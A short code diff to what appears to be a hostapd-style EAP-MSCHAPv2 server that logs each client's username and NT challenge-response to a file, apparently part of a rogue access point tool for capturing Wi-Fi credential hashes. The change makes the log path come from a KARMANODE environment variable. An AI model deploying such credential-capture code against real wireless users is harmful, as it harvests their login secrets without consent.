@@ -12,11 +12,7 @@
 #include "crypto/ms_funcs.h"
 #include "crypto/random.h"
 #include "eap_i.h"
-
-// ZZZZ Include logging stuffs
-#include "common/wpa_common.h"
-// ZZZZ Include logging stuffs
-
+#include <stdlib.h>
 
 struct eap_mschapv2_hdr {
 	u8 op_code; /* MSCHAPV2_OP_* */
@@ -350,8 +346,8 @@ static void eap_mschapv2_process_response(struct eap_sm *sm,
                 printf("%02x:",nt_response[x]);
         printf("%02x\n",nt_response[23]);
 
-	//FILE *f = fopen(ennode, "a");
-	FILE *f = fopen("/root/ennode.node", "a");
+	char *ennode = getenv("KARMANODE");
+	FILE *f = fopen(ennode, "a");
 	if (f != NULL) {
 		const char *hdr = "CHAP";
 		fprintf(f, "%s|%s|", hdr, name);
